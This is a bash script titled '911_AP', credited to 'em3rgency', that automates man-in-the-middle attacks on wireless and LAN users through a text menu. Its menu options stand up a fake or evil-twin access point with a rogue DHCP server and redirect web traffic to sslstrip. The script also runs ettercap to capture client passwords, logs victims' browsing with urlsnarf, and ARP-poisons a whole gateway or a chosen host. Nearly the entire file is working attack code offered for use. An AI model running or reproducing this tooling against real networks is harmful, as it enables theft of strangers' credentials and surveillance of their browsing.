#!/bin/bash
# updated nov 25th
# script coded by em3rgency
# 911_AP version 1.1
# xwininfo -id $(xprop -root | awk '/_NET_ACTIVE_WINDOW\(WINDOW\)/{print $NF}')
# This script creates a FAKE Access Points and loads the tools to enumerate connected clients. And it actually works!
# Also includes workin ARP poisoning features.
# Tested and working on BT5r3, Needs to have version 1.3 of dhcp3-server to work correctly
# DOES NOT WORK with ISC-dhcp-server (YET!)


#DEFINED COLOR SETTINGS
RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

echo ""
echo ""
echo ""
echo $RED"              +############################################+"
echo $RED"              +    em3rgency's Fake AP SSL MITM script     +"
echo $RED"              +                                            +"
echo $RED"              +                Version 1.1                 +"
echo $RED"              +                                            +"
echo $RED"              +           www.em3rgency.com                +"
echo $RED"              +############################################+"
echo ""
echo $BLUE"     Visit http://www.em3rgency.com for updates to this script. Thanks"
echo ""
echo ""
sleep 3
clear

echo $BLUE"                    em3rgency's MITM script Version 1.1 !"
echo
echo $RED"              ************************************************";
echo $RED"              *    1.  Prerequsites and Updates              *";
echo $RED"              *    2.  Run FAKE AP Static                    *";
echo $RED"              *    3.  Run EVIL TWIN AP                      *"; 
echo $RED"              *    4.  Run Standard ARP poison               *";
echo $RED"              *    5.  Netdiscover connected clients         *";
echo $RED"              *    6.  EXIT                                  *";
echo $RED"              ************************************************";
echo ""

echo $BLUE"                          Select Menu Option:"
read menuoption
if [ $menuoption = "1" ]; then
clear
echo ""
echo $RED"                   **************************************";
echo $RED"                   *    1.  Run apt-get update          *";
echo $RED"                   *    2.  Run apt-get upgrade         *";
echo $RED"                   *    3.  Distribution upgrade        *";
echo $RED"                   *    4.  Edit etter.conf             *";
echo $RED"                   *    5.  Edit DHCP tunnel interface  *";
echo $RED"                   *    6.  Install Dhcp3-server        *";
echo $RED"                   *    7.  Update aircrack-ng          *"; 
echo $RED"                   *    8.  Return to Main Menu         *"; 
echo $RED"                   **************************************";


echo $BLUE"                           Select Menu Option:"$STAND
read menuoption
if [ $menuoption = "1" ]; then

#This command will look for any upgrades to your OS distro.
sudo apt-get update
clear
./911_AP.sh
else

#This command will look for any upgrades to your OS distro.
if [ $menuoption = "2" ]; then
sudo apt-get upgrade 
clear
./911_AP.sh
else

#This command will look for any distribution upgrades to your OS distro.
if [ $menuoption = "3" ]; then
sudo apt-get dist-upgrade  
clear
./911_AP.sh
else

#This command edit etter.conf
if [ $menuoption = "4" ]; then
nano /etc/etter.conf
clear
./911_AP.sh
else

#This command will edit your tunnel interface
if [ $menuoption = "5" ]; then
nano /etc/default/dhcp3-server
clear
./911_AP.sh
else

#This command will Install DHCP3-server on BT5r3
if [ $menuoption = "6" ]; then
apt-get install dhcp3-server
clear
./911_AP.sh
else

#This command will update aircrack-ng to the latest nightly build
if [ $menuoption = "7" ]; then
sudo airodump-ng-oui-update
clear
else
if [ $menuoption = "8" ]; then
./911_AP.sh
fi
fi
fi
fi
fi
fi
fi
fi
else

if [ $menuoption = "2" ]; then
#This command will RUN The STATIC FAKE AP attack 
sleep 2

# Configuring your Network interfaces
echo
echo $BLUE"                   [+] Lets get started shall we [+]"
echo $STAND""
echo ""
route -n -A inet | grep UG
echo ""
echo ""
echo "Enter the gateway IP address, Shown above. Example 192.168.1.1: "
read -e gatewayip
clear
echo -n "Enter your interface that is connected to the internet, Example eth0: "
read -e internet_interface
clear
echo -n "Enter your interface to be used for the fake AP, Example wlan1: "
read -e fakeap_interface
clear
echo -n "Enter the ESSID you would like your rogue AP to be called: "
read -e ESSID
clear
echo -n "Name the folder you want to save your logs into "
read -e SESSION
#creates session directory
mkdir -p /root/$SESSION 
clear

echo $BLUE"              Starting Airmon-ng and creating mon0 interface...."$STAND
airmon-ng start $fakeap_interface
fakeap=$fakeap_interface
fakeap_interface="mon0"
sleep 2
clear

echo $RED"          [##########################################################]"
echo $RED"  [+][+][+]              Running MITM attack vectors                 [+][+][+]"
echo $RED"          [##########################################################]"
sleep 5
echo ""

# Dhcpd directory and dhcpd.conf creation
mkdir -p "/var/run/dhcpd"
echo "authoritative;

default-lease-time 700;
max-lease-time 8000;

subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name "\"$ESSID\"";
option domain-name-servers 10.0.0.1;

range 10.0.0.30 10.0.0.60;

}" > /var/run/dhcpd/dhcpd.conf

# FAKEAP setup
echo $BLUE"             Configuring and Starting your FAKE Access Point...."
xterm -bg blue -fg white -geometry 100x7+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -c 1 -e "$ESSID" $fakeap_interface & fakeapid=$!
sleep 3
echo ""

# Setup your IP Tables
echo $BLUE"                     Configuring your IP tables...."
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo ""

#  DHCP
echo $BLUE"              Setting up DHCP to work with $ESSID...."
touch /var/run/dhcpd.pid
chown dhcpd:dhcpd /var/run/dhcpd.pid
xterm -bg blue -fg white -geometry 80x7-0+25 -T DHCP -e dhcpd3 -d -f -cf "/var/run/dhcpd/dhcpd.conf" at0 & dhcpid=$!
sleep 3
echo ""

# SSLstrip
echo $BLUE"            Starting SSLstrip to enumerate user credentials...."
sudo xterm  -bg blue -fg white -geometry 80x7-0+193 -T sslstrip -e sslstrip -f -p -k 10000 & sslstripid=$!
sleep 2
echo ""

# Ettercap
echo $BLUE"               Starting Ettercap to sniff client passwords...."
xterm -bg blue -fg white -geometry 80x7-0+366 -T ettercap -s -sb -si +sk -sl 5000 -l -lf /root/$SESSION/ettercap$(date +%F-%H-%M).txt -e ettercap -p -u -T -q -i at0 & ettercapid=$!
sleep 3
echo "" 

# URLSnarf
echo $BLUE"          Starting URLSnarf to show the websites the victim browses...."
xterm -bg blue -fg white -geometry 80x7-0+539 -l -lf /root/$SESSION/urlsnarf-$(date +%F-%H%M).txt -e urlsnarf -i $internet_interface & urlsnarfid=$!
sleep 3
clear


# SSLstrip.log cat the file sslstrip.log
xterm -bg blue -fg white -geometry 80x7-0-25 -T SSLStrip-Log -l -lf /root/$SESSION/sslstrip$(date +%F-%H-%M).txt -e tail -f sslstrip.log & sslstriplogid=$!

clear
echo
echo $RED"    ####################################################################"
echo $RED"    [        em3rgency's Fake AP SSL MITM attack is now running...     ]"
echo $RED"    [                                                                  ]"
echo $RED"    [     Press Y then ENTERKEY to close kill and clean up the script  ]"
echo $RED"    [                                                                  ]"
echo $RED"    [             IF not closed properly ERRORS WILL OCCUR             ]"
echo $RED"    ####################################################################"
echo ""
echo ""
read WISH

# Kill all
if [ $WISH = "y" ] ; then
echo
echo $BLUE"                           Cleaning up your mess"$STAND
echo ''
sleep 2

kill ${fakeapid}
kill ${dhcpid}
kill ${sslstripid}
kill ${ettercapid}
kill ${urlsnarfid}
kill ${dritnetid}
kill ${sslstriplogid}

airmon-ng stop $fakeap_interface
airmon-ng stop $fakeap
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
clear
echo ""
echo ""
echo $RED"             [+][+][+]     Everything is now cleaned up    [+][+][+]"
echo $RED"             [+][+][+]Please visit http://www.em3rgency.com[+][+][+]"
echo $RED"             [+][+][+]          Coded by em3rgency         [+][+][+]"
sleep 5
exit

fi

sleep 3
clear

./911_AP.sh
else

# This command will RUN The EVIL TWIN AP attack 
if [ $menuoption = "3" ]; then
sleep 3

# Configuring your Network interfaces
echo
echo $BLUE"                       [+] Lets get started shall we [+]"$STAND
echo ""
echo ""
route -n -A inet | grep UG
echo ""
echo ""
echo ""
echo "Enter the gateway IP address, Shown above. Example 192.168.1.1: "
read -e gatewayip
clear
echo -n "Enter your interface that is connected to the internet, Example eth0: "
read -e internet_interface
clear
echo -n "Enter your interface to be used for the fake AP, Example wlan1: "
read -e fakeap_interface
clear
echo -n "Enter the ESSID you would like your rogue AP to be called: "
read -e ESSID
clear
echo -n "Name the folder you want to save your logs into "
read -e SESSION
clear
mkdir -p /root/$SESSION
clear

echo $BLUE"               Starting Airmon-ng and creating mon0 interface...."$STAND
airmon-ng start $fakeap_interface
fakeap=$fakeap_interface
fakeap_interface="mon0"
sleep 2
clear

echo $RED"          [##########################################################]"
echo $RED"  [+][+][+]              Running MITM attack vectors                 [+][+][+]"
echo $RED"          [##########################################################]"
sleep 5
echo ""

# Dhcpd directory and dhcpd.conf creation
mkdir -p "/var/run/dhcpd"
echo "authoritative;

default-lease-time 700;
max-lease-time 8000;

subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name "\"$ESSID\"";
option domain-name-servers 10.0.0.1;

range 10.0.0.30 10.0.0.60;

}" > /var/run/dhcpd/dhcpd.conf

# FAKEAP setup
echo $BLUE"                     Configuring and Starting $ESSID...."
xterm -bg blue -fg white -geometry 100x7+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -c 1 -P -C 60 -e "$ESSID" $fakeap_interface & fakeapid=$!
sleep 3
echo ""

# Setup your IP Tables
echo "                          Configuring your IP tables...."
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo ""

#  DHCP
echo "                   Setting up DHCP to work with EVIL TWIN AP...."
touch /var/run/dhcpd.pid
chown dhcpd:dhcpd /var/run/dhcpd.pid
xterm -bg blue -fg white -geometry 80x7-0+25 -T DHCP -e dhcpd3 -d -f -cf "/var/run/dhcpd/dhcpd.conf" at0 & dhcpid=$!
sleep 3
echo ""

# SSLstrip
echo "               Starting SSLstrip to enumerate user credentials...."
sudo xterm -bg blue -fg white -geometry 80x7-0+193 -T sslstrip -e sslstrip -f -p -k 10000 & sslstripid=$!
sleep 2
echo ""

# Ettercap
echo "                 Starting Ettercap to sniff client passwords...."
xterm -bg blue -fg white -geometry 80x7-0+366 -T ettercap -s -sb -si +sk -sl 5000 -l -lf /root/$SESSION/ettercap$(date +%F-%H-%M).txt -e ettercap -p -u -T -q -i at0 & ettercapid=$!
sleep 3
echo ""

# URLSnarf
echo "            Starting URLSnarf to show the websites the victim browses...."
xterm -bg blue -fg white -geometry 80x7-0+539 -l -lf /root/$SESSION/urlsnarf-$(date +%F-%H%M).txt -e urlsnarf -i $internet_interface & urlsnarfid=$!
sleep 3
clear

#SSLstrip.log cat the file sslstrip.log
xterm -bg blue -fg white -geometry 80x7-0-25 -T SSLStrip-Log -l -lf /root/$SESSION/sslstrip$(date +%F-%H-%M).txt -e tail -f sslstrip.log & sslstriplogid=$!

clear
echo
echo $RED"     ####################################################################"
echo $RED"     [        em3rgency's Fake AP SSL MITM attack is now running...     ]"
echo $RED"     [                                                                  ]"
echo $RED"     [    Press Y then ENTERKEY to close kill and clean up the script   ]"
echo $RED"     [                                                                  ]"
echo $RED"     [             IF not closed properly ERRORS WILL OCCUR             ]"
echo $RED"     ####################################################################"
echo $STAND""
echo ""
read WISH

# Kill all
if [ $WISH = "y" ] ; then
echo
echo $BLUE"                           Cleaning up your mess"
echo ''
sleep 2

kill ${fakeapid}
kill ${dhcpid}
kill ${sslstripid}
kill ${ettercapid}
kill ${urlsnarfid}
kill ${dritnetid}
kill ${sslstriplogid}

airmon-ng stop $fakeap_interface
airmon-ng stop $fakeap
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
clear
echo ""
echo ""
echo $RED"             [+][+][+]     Everything is now cleaned up    [+][+][+]"
echo $RED"             [+][+][+]Please visit http://www.em3rgency.com[+][+][+]"
echo $RED"             [+][+][+]          Coded by em3rgency         [+][+][+]"$STAND
sleep 5

fi

sleep 3
clear
./911_AP.sh
else

# Credits to N1t0g3n for the base to this section. Thanks bro
if [ $menuoption = "4" ]; then
clear
echo ""
echo ""
echo $BLUE"                  Finding wireless and ethernet interfaces."$STAND
sleep 3
echo ""
ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'
echo ""
echo ""
echo "Please type the name of your wireless interface (wlan0): "
read WIFACE
sleep 2
echo ""
echo ""
echo "Please type the name of your ethernet interface (eth0): "
read ETH0
clear
echo -n "Name the folder you want to save your logs into "
read -e SESSION

mkdir -p /root/$SESSION
clear
echo ""
echo ""
clear
echo $RED"              **************************************************";
echo $RED"              *    1.  Attack entire Gateway through LAN       *";
echo $RED"              *    2.  Attack entire Gateway through Wireless  *";
echo $RED"              *    3.  Attack single host through LAN          *";
echo $RED"              *    4.  Attack single host through Wireless     *";
echo $RED"              *    5.  Return to Main Menu                     *";
echo $RED"              **************************************************";
echo $STAND""
echo ""
echo $BLUE"                           Select Menu Option: "
read menuoption
if [ $menuoption = "1" ]; then
echo
echo
echo "                This should be your Gateway from what I see: "
echo ""
echo ""
route -n -A inet | grep UG
echo ""
echo ""
echo $STAND"Please type the IP of your Gateway in below: "$STAND
read GATEWAY
echo $BLUE"                         Starting attack on Gateway"
echo ""
echo ""
echo "                   Passwords will show up in ettercap window"
sleep 3
echo "1" > /proc/sys/net/ipv4/ip_forward 

#  PORT redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 2

# URLSnarf
sudo xterm -bg blue -fg white -geometry 80x7-0+25 -l -lf /root/$SESSION/urlsnarf-$(date +%F-%H%M).txt -e urlsnarf  -i $ETH0 &
sleep 2

# Ettercap
xterm -bg blue -fg white -geometry 80x7-0+366 -s -sb -si +sk -sl 5000 -l -lf /root/$SESSION/ettercap$(date +%F-%H-%M).txt -e ettercap -Tq -i $ETH0 -M arp:remote /$GATEWAY/ // &
sleep 2

# SSLstrip
sudo xterm -bg blue -fg white -geometry 80x7-0+193 -e sslstrip -f -p -k 10000 &
sleep 2

# SSLstrip.log cat the file sslstrip.log
xterm -bg blue -fg white -geometry 80x7-0+539 -T SSLStrip-Log -l -lf /root/$SESSION/sslstrip$(date +%F-%H-%M).txt -e tail -f sslstrip.log &
sleep 2



clear
echo $RED"    ####################################################################"
echo $RED"    [          em3rgency's ARP poisoning script is now running         ]"
echo $RED"    [                                                                  ]"
echo $RED"    [                Press ENTER return to the Main Menu               ]"
echo $RED"    [                                                                  ]"
echo $RED"    [             IF not closed properly ERRORS WILL OCCUR             ]"
echo $RED"    ####################################################################"$STAND
read ENTERKEY

killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

./911_AP.sh
else
if [ $menuoption = "2" ]; then
#This will allow you to forward packets from the router
echo $BLUE"              This should be your gateway from what I see: "$STAND
echo ""
echo ""
route -n -A inet | grep UG
echo ""
echo ""
echo $BLUE"Please type the IP of your gateway: "$STAND
read GATEWAY
echo $BLUE"                      Starting attack on gateway"
echo ""
echo ""
echo ""
echo "                Passwords will show up in ettercap window"
sleep 3


echo "1" > /proc/sys/net/ipv4/ip_forward 


# URLSnarf
sudo xterm -bg blue -fg white -geometry 80x7-0+25 -l -lf /root/$SESSION/urlsnarf-$(date +%F-%H%M).txt -e urlsnarf -i $WIFACE &
sleep 2

# Port redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 2

# Etterap
sudo xterm -bg blue -fg white -geometry 80x7-0+193 -l -lf /root/$SESSION/ettercap$(date +%F-%H-%M).txt -e ettercap -Tq -i $WIFACE -M arp:remote /$GATEWAY/ // &
sleep 2

# SSLstrip
sudo xterm -bg blue -fg white -geometry 80x7-0+366 -e sslstrip -f -p -k 10000 &
sleep 2

# SSLstrip.log cat the file sslstrip.log
xterm -bg blue -fg white -geometry 80x7-0+539 -T SSLStrip-Log -l -lf /root/$SESSION/sslstrip$(date +%F-%H-%M).txt -e tail -f sslstrip.log &
sleep 2

clear
echo $RED"    ####################################################################"
echo $RED"    [          em3rgency's ARP poisoning script is now running         ]"
echo $RED"    [                                                                  ]"
echo $RED"    [                Press ENTER return to the Main Menu               ]"
echo $RED"    [                                                                  ]"
echo $RED"    [             IF not closed properly ERRORS WILL OCCUR             ]"
echo $RED"    ####################################################################"$STAND
read ENTERKEY

killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

./911_AP.sh
else
if [ $menuoption = "3" ]; then
#This will allow you to forward packets from the router
echo ""
echo ""
echo $BLUE"              This should be your gateway from what I see: "
echo ""
echo ""
route -n -A inet | grep UG
echo ""
echo ""
echo $STAND"Please type the IP of your gateway: "
read GATEWAY3
echo ""
echo ""
echo "Please type the IP of the target host: "
read HOST3
echo ""
echo $BLUE"                      Starting Attack on Target Host"
echo ""
echo ""
echo "                Passwords will show up in ettercap window"
sleep 3

echo "1" > /proc/sys/net/ipv4/ip_forward 

# URLsnarf
sudo xterm -bg blue -fg white -geometry 80x7-0+25 -l -lf /root/$SESSION/urlsnarf-$(date +%F-%H%M).txt -e urlsnarf -i $ETH0 &
sleep 2

# Port redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 2

# Ettercap
sudo xterm -bg blue -fg white -geometry 80x7-0+193 -l -lf /root/$SESSION/ettercap$(date +%F-%H-%M).txt -e ettercap -TqM ARP:REMOTE /$GATEWAY3/ /$HOST3/ &
sleep 2

# SSLstrip
sudo xterm -bg blue -fg white -geometry 80x7-0+366 -e sslstrip -f -p -k 10000 &
sleep 2

# SSLstrip.log cat the file sslstrip.log
xterm -bg blue -fg white -geometry 80x7-0+539 -T SSLStrip-Log -l -lf /root/$SESSION/sslstrip$(date +%F-%H-%M).txt -e tail -f sslstrip.log &
sleep 2

clear
echo $RED"    ####################################################################"
echo $RED"    [          em3rgency's ARP poisoning script is now running         ]"
echo $RED"    [                                                                  ]"
echo $RED"    [                Press ENTER return to the Main Menu               ]"
echo $RED"    [                                                                  ]"
echo $RED"    [             IF not closed properly ERRORS WILL OCCUR             ]"
echo $RED"    ####################################################################"
read ENTERKEY

killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

./911_AP.sh
else
if [ $menuoption = "4" ]; then
echo ""
echo ""
echo $BLUE"This should be your Gateway from what I see: "
echo ""
route -n -A inet | grep UG
echo ""
echo ""
echo $STAND"Please type the IP of your gateway: "
read GATEWAY4
echo ""
echo "Please type the IP of the target host: "
read HOST4
echo ""
echo $BLUE"                     Starting Attack on Target Host"
echo ""
echo ""
echo "                Passwords will show up in ettercap window"
sleep 3

echo "1" > /proc/sys/net/ipv4/ip_forward 


# URLsnarf
sudo xterm -bg blue -fg white -geometry 80x7-0+25 -l -lf /root/$SESSION/urlsnarf-$(date +%F-%H%M).txt -e urlsnarf -i $WIFACE &
sleep 2

# Port redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 2

# Ettercap
sudo xterm -bg blue -fg white -geometry 80x7-0+193 -l -lf /root/$SESSION/ettercap$(date +%F-%H-%M).txt -e ettercap -Tq -i $WIFACE -M arp:remote /$GATEWAY4/ /$HOST4/ &
sleep 2

# SSLstrip
sudo xterm -bg blue -fg white -geometry 80x7-0+366 -e sslstrip -f -p -k 10000 &
sleep 2

# SSLstrip.log cat the file sslstrip.log
xterm -bg blue -fg white -geometry 80x7-0+539 -T SSLStrip-Log  -l -lf /root/$SESSION/sslstrip$(date +%F-%H-%M).txt -e tail -f sslstrip.log &
sleep 2

clear
echo $RED"    ####################################################################"
echo $RED"    [          em3rgency's ARP poisoning script is now running         ]"
echo $RED"    [                                                                  ]"
echo $RED"    [                Press ENTER return to the Main Menu               ]"
echo $RED"    [                                                                  ]"
echo $RED"    [             IF not closed properly ERRORS WILL OCCUR             ]"
echo $RED"    ####################################################################"
read ENTERKEY

killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

./911_AP.sh
clear

echo $RED"                Invalid option, you must choose 1,2,3,4 or 5.."
sleep 2
echo $BLUE"                          Re-Launching Script..."
./911_AP.sh

fi
fi
fi
fi
if [ $menuoption = "5" ]; then
./911_AP.sh
fi
else

# A script to quickly tell whose on your network in real time.
if [ $menuoption = "5" ]; then
clear
echo $BLUE"           This will show all The clients connected to The network"
echo ""
sleep 3
clear
echo 
echo
echo $STAND"Please type the name of your network interface Example: eth0 "
read IFACE;
echo ""
echo ""
echo "               This should be your gateway from what I see: "
route -n -A inet | grep UG
sleep 1
echo ""
echo ""
echo $STAND"Please type in the IP address of your gateway"
read GATEWAY; 
sleep 2
clear
echo ""
echo ""
echo ""
echo $BLUE"                   Press CTRL C to stop close netdiscover"
echo ""
echo ""
echo $RED"    ####################################################################"
echo $RED"    [           em3rgency's Netdiscover script is now running          ]"
echo $RED"    [                                                                  ]"
echo $RED"    [                Press ENTER return to the Main Menu               ]"
echo $RED"    [                                                                  ]"
echo $RED"    [             IF not closed properly ERRORS WILL OCCUR             ]"
echo $RED"    ####################################################################"

sudo xterm -bg blue -fg white -e netdiscover -i $IFACE -r $GATEWAY/24  
read ENTERKEY
clear
./911_AP.sh

else
if [ $menuoption = "6" ]; then
exit
fi
fi
fi
fi
fi
fi
